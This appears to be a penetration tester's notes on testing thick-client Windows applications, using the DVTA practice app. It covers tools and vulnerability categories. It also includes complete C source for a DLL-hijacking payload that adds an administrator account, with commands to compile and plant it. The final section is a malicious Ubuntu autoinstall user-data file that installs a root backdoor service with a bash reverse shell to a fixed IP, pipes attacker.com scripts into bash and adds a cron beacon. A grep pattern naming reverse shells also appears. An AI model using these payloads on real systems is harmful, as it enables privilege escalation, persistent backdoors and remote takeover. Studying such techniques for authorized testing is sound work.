# Strategy
*When they give it to you, even when they don't realize they gave it to you, make full use of it. If it's a client, reverse it, evaluate the source code, and use that to leverage attacks against the server. Effectively, if they give it to you, even if they don't realize they're giving it to you, it is your job to try to see how you can maximize the impact.* ~ Daniel Owens

DVTA  - Vulnerable Thick Client Application
https://github.com/srini0x00/dvta

## Common Vulnerabilities
1. Sensitive data leakage
2. DLL Hijacking
3. Improper Error Handling
4. Injection
5. Reverse Engineering
6. Session Management
7. Insecure Storage
8. SSL/TS
9. Business Logic
10. Weak Encryption Checks

## Tools
1. dnSpy - can be used to find hardcoded sensitive data and update values on the fly. Also check for code obfuscation.
2. Echo Mirage - enables intercepting non-HTTP traffic between the thick client and local or remote server. Can also hook into tested thick client application process to intercept communication between thick client app and local or remote server.
3. sigcheck64.exe - check digital signature on application
4. Winhex - sensitive data leakage. Commercial disk editor and universal hexadecimal editor used for data recovery and digital forensics.
5. strings.exe (sysinternals) check for hardcoded data
6. Nmap - check for ports the app opens.
7. Procmon
8. Sysinternals Suite
9. Testssl
10. Dot Peek
11. VB Decompiler
12. Metasploit - use to create a malicious DLL file
13. Burpsuite
14. Wireshark
15. Ollydbg - 32-bit assembler level analyzing debugger for Microsoft Windows. Emphasis on binary code analysis.  https://www.ollydbg.de/
	1. 64-bit Ollydbg - https://www.ollydbg.de/odbg64.html
16. .Net Reflector - https://www.red-gate.com/products/dotnet-development/reflector/
17. Winhex - sensitive data exposure
18. CFF Explorer, PE Editing - https://ntcore.com/?page_id=388
19. PEiD, A tool that detects most common packers, cryptors and compilers for PE files. - https://www.aldeid.com/wiki/PEiD
20. Detect it Easy (DIE), A program for determining file types for Windows, Linux and macOS.- https://github.com/horsicq/Detect-It-Easy
21. WinSpy++,   A tool whose purpose is to help you view and modify the properties of any window in your system with great ease.- https://www.softpedia.com/get/Programming/Other-Programming-Files/WinSpyPlusPlus.shtml
22. WinManipulate, A simple tool to manipulate window objects in Windows. - https://github.com/appsecco/winmanipulate
23. Windows Enabled, A simple tool that lets you activate functions your thick client application has blocked. - https://windows-enabler.en.uptodown.com/windows
24. Volatility An open-source (LGPL) registry compare utility that allows you to quickly take a snapshot of your registry and then compares it with a second one – used after doing system changes or installing a new software product. -  https://github.com/volatilityfoundation/volatility
25. Process Explorer
26. checksec

### Ghidra
1. Window -> Defined Strings

## macOS Important Directories
- `/Users/username/Library/Preferences`
- `/Users/username/Library/Application Support`
- `/Users/username/Library/Saved Application State`
- `/Users/username/Library/Containers`
- `/Users/username/Library/Group Containers`


## Recon Phase
1. Discover technologies in use (language, framework, etc.)
2. Understand application's functionality and behavior
3. Identify all points of entry via user input
4. Understand core security mechanisms used by the application
5. Identify common vulnerabilities associated with the language/framework in use:
	1. [https://cve.mitre.org/cve/search_cve_list.html](https://cve.mitre.org/cve/search_cve_list.html)
	2. [https://www.exploit-db.com/](https://www.exploit-db.com/)

## Categories of Vulnerabilities to Test
1. <mark style="background: #BBFABBA6;">Sensitive data leakage</mark>
		1. Open binaries in tools such as winhex, strings, etc. to see if any sensitive information is leaked.
		2. Anything in memory? Check procmon
	2. DLL Hijacking - [[PNPT-Windows Privilege Escalation for Beginners#Escalation Path: DLL Hijacking]]
2. <mark style="background: #BBFABBA6;">Improper Error Handling</mark>
		1. See if erroneous input can be injected to produce errors that are unhandled and potentially leak sensitive info.
3. <mark style="background: #BBFABBA6;">Privilege Escalation via DLL Hijacking</mark>
	1. Process Monitor -
		1. Path ends with .dll
		2. Result is NAME NOT FOUND
4. <mark style="background: #BBFABBA6;">Injection</mark>
		1. SQL Injection
			1. Example: Login. Username `' OR 1=1;--`
		2. Code injection
		3. DLL Injection - the process of loading a third-party dynamic library to inject third-party code into an active process. Can be used to elevate permissions during application runtime if the application runs as an elevated user. Do not launch applications with administrator access.
			1. Process Hacker - can be used to automate DLL injection
		4. DLL Hijacking - launch procmon and locate DLLs with "NAME NOT FOUND", indicates the DLL is missing but the application still searches for it during runtime. Compile malicious DLL to create and admin user. Copy DLL to expected path then re-launch application.
		5. DLL Search Order Hijacking - similar to DLL Hijacking, the application looks for DLLs in the installation directory first, but the DLLs are actually located in an environment variable path. The application can be configured to search for a different path prior to the actual path of the DLL thus allowing execution of a malicious DLL in an attacker-controllable directory.
5. <mark style="background: #BBFABBA6;">Reverse Engineering</mark>
		1. Run through dnSpy
		2. Ghidra
6. <mark style="background: #BBFABBA6;">Authentication</mark>
		1. Missing authentication for critical function - application does not provide any authentication for features that demand a verifiable user identity or take a lot of resources. Application does not require authentication or elevated authentication to access capabilities of the highest privilege. Possibly, the application does not require any authentication to execute tasks such as changing a username/password.
7. <mark style="background: #BBFABBA6;">Session Management</mark>
		1. JWT misconfigurations
		2. Unenforced expiration of session tokens during logout or expiration date
		3. Weaknesses in tokens
8. <mark style="background: #BBFABBA6;">Outdated Software</mark>
		1. Check dependencies
		2. Look in install directory, check properties on DLL files that might be third-party dependencies. Check for GitHub page of projects, Security Advisories, NVDL https://nvd.nist.gov/vuln/search
9. <mark style="background: #BBFABBA6;">Insecure Storage</mark>
		1. Anything stored in the install directory that's sensitive?
		2. Anything stored in user's profile directory that's sensitive?
		3. Check config files for sensitive info
		4. Sensitive data storage in plaintext
		5. Sensitive Data in Memory - check core dumps and swap files. Avoid storing sensitive data in plaintext. When possible, always clear sensitive data after use by explicitly zeroing out the memory. Focus on minimizing rather than eliminating risk in languages that lack a mechanism for zeroing out memory such as Java or C#. When dealing with sensitive data, try to avoid using immutable types (for example, use a character array rather than a String). Keep the time window in which sensitive information is present in memory as short as possible to reduce the likelihood of being swapped to disk. 
10. <mark style="background: #BBFABBA6;">Software and Data Integrity Failures</mark>
		1. Missing Compile-Time Binary Protections - binary protection flags help defend against memory-based exploits during runtime such as buffer overflow, heap overflows, and other memory-based attacks against software. Protection flags include Control Flow Guard (CFG), Buffer Security Check (/GS), and digital signatures. For Java, can digital signatures be removed from JAR files allowing modification?
11. <mark style="background: #BBFABBA6;">Cryptographic Failures</mark>
		1. Check for SSL/TLS misconfigurations
		2. Wireshark
		3. Check connection between client / server to see if secure or if crypto can be broken
		4. Transmission of sensitive information in the clear. Inspect with Wireshark. 
12. <mark style="background: #BBFABBA6;">Business Logic</mark>
		1. Any ordered steps in the app that can be abused or skipped
13. <mark style="background: #BBFABBA6;">Weak Encryption Checks</mark>
		1. No code signing applied
		2. Weak local encryption
		3. Weak cipher suites supported to server
		4. Custom encryption to server

## DLL Hijacking
Use Process Monitor to find DLL files used by target application which do not implement full paths.
1. Identify if application is vulnerable:
	1. Install Microsoft Process Monitor
	2. Create Filter:
	3. Result is NAME NOT FOUND -> Add
	4. Path ends with .dll -> Add
	5. Process Name is 'App Name Here' -> Add
	6. Search for 'NAME NOT FOUND' in Result column. 
	7. Evaluate .dll files used by application to confirm they do not exist or if you have permissions to write to a directory in a higher search order.
2. Install mingw for macOS or Linux
3. Create file as `add_user.c`, update with source code below.
4. Compile: `x86_64-w64-mingw32-gcc add_user.c -shared -o add_user.dll -lnetapi32 -ladvapi32`
5. Test: `rundll32.exe .\add_user.dll,CreateAdminUser`
6. Install DLL into app installation path or directory with higher searcher order.
7. Restart service *or* launch application as privileged user.


### Linux Creation of DLL
```C#
#include <windows.h>
#include <lmerr.h>
#include <lmaccess.h>
#include <stdio.h>
#include <tchar.h>

#pragma comment(lib, "Netapi32.lib") 

// Internal function to create a user and add to the admin group
void CreateAdminUserInternal() {
USER_INFO_1 ui;
DWORD dwLevel = 1;
DWORD dwError = 0;
NET_API_STATUS nas;

// User details (customize these)
LPCWSTR username = L"newuser";
LPCWSTR password = L"P@ssw0rd123!";
LPCWSTR groupname = L"Administrators"; 

// 1. Create the new user account
ui.usri1_name = (LPWSTR)username;
ui.usri1_password = (LPWSTR)password;
ui.usri1_priv = USER_PRIV_USER;
ui.usri1_home_dir = NULL;
ui.usri1_comment = L"User with admin rights via DLL";
ui.usri1_flags = UF_SCRIPT | UF_PASSWD_CANT_CHANGE | UF_NORMAL_ACCOUNT;
ui.usri1_script_path = NULL;

nas = NetUserAdd(NULL, dwLevel, (LPBYTE)&ui, &dwError);

if (nas == NERR_Success || nas == NERR_UserExists) {
// 2. Add the user to the "Administrators" local group
	LOCALGROUP_MEMBERS_INFO_0 lgmi0;
	lgmi0.lgrmi0_sid = NULL; // SID can be looked up or handle this differently
	system("cmd.exe /C net localgroup administrators newuser /add");

	char command[256];
	sprintf_s(command, sizeof(command), "net localgroup Administrators %ws /add", username);
system(command);

	}

}

// DLL entry point

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call) {
case DLL_PROCESS_ATTACH:
CreateAdminUserInternal();
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DETACH:
break;
}

return TRUE;
}

// Exported function for use with rundll32.exe
#ifdef __cplusplus
extern "C" {
#endif
__declspec(dllexport) void __stdcall CreateAdminUser(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow) {
CreateAdminUserInternal();
}
#ifdef __cplusplus
}
#endif
```


# ISO

## Search ISO for Secrets
1. Mount ISO: `sudo mount -o loop ~/source.iso /mnt/iso`
2. Search for secrets:
```bash
grep -irE --color=always '@|=|TODO|Key|Secret|Password|Pass|Passwd|credential|passphrase|sql|crypt|md5|sha1|sha-1|3des|des3|TripleDES|rc4|arcfour|ftp:|public-read|AWS_KEY|AWS-KEY|ssl_version|cookie|-----BEGIN (RSA|DSA|EC|OPENSSH|ENCRYPTED|PGP|PRIVATE)( PRIVATE)? KEY-----|-----BEGIN CERTIFICATE-----|AKIA[0-9A-Z]{16}|AIza[0-9A-Za-z_-]{35}|gh[pousr]_[A-Za-z0-9_]{36,255}|xox[baprs]-[0-9]{10,13}-[0-9]{10,13}-[A-Za-z0-9]{24,32}|sk_live_[0-9a-zA-Z]{24,}|SK[0-9a-fA-F]{32}|dop_v1_[a-f0-9]{64}|(password|passwd|pwd|pass|secret|api[_-]?key|access[_-]?token|auth[_-]?token|bearer)[[:space:]]*[=:][[:space:]]*['\'']?[A-Za-z0-9!$%^&*()_+=/-]{4,}|(mysql|postgresql|mongodb|redis|mariadb)://[^:/@]+:[^:/@]+@|(https?|ftp|sftp)://[^:/@]+:[^:/@]+@|eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]+|aws_secret_access_key.*[A-Za-z0-9/+=]{40}|[A-Za-z0-9+/]{86}==|[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}|(backdoor|reverse[_-]?shell|rootkit|payload)|/dev/tcp/[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}/[0-9]+|bash[[:space:]]+-[ci]|nc[[:space:]]+-.*[0-9]{1,3}\.[0-9]{1,3}' -B10 -A10 . | more
```

## If using curtin, create malicious user-data entry in file:
autoinstall/user-data file:
```YAML
# The autoinstall configuration is typically in the ISO at specific locations

# For cloud-init based autoinstall, it's in /nocloud/ or served via path

  

# Create malicious user-data

cat > extract/nocloud/user-data <<'EOF'

#cloud-config

autoinstall:

version: 1

identity:

hostname: ubuntu-server

username: admin

password: "$6$rounds=4096$..."

ssh:

install-server: yes

allow-pw: yes

late-commands:

# Install persistent backdoor

- curtin in-target -- bash -c 'cat > /etc/systemd/system/backdoor.service <<SERVICE

[Unit]

Description=System Maintenance Service

After=network.target

  

[Service]

Type=simple

ExecStart=/usr/local/bin/backdoor.sh

Restart=always

User=root

  

[Install]

WantedBy=multi-user.target

SERVICE'

# Create the backdoor script

- curtin in-target -- bash -c 'cat > /usr/local/bin/backdoor.sh <<SCRIPT

#!/bin/bash

# Reverse shell to attacker

while true; do

bash -i >& /dev/tcp/192.168.250.132/4444 0>&1

sleep 300

done

SCRIPT'

- curtin in-target -- chmod +x /usr/local/bin/backdoor.sh

- curtin in-target -- systemctl enable backdoor.service

user-data:

# Post-installation cloud-init runs on first boot

runcmd:

- curl http://attacker.com/stage2.sh | bash

write_files:

- path: /etc/cron.d/persistence

permissions: '0644'

content: |

*/5 * * * * root curl -s http://attacker.com/beacon.sh | bash

EOF
```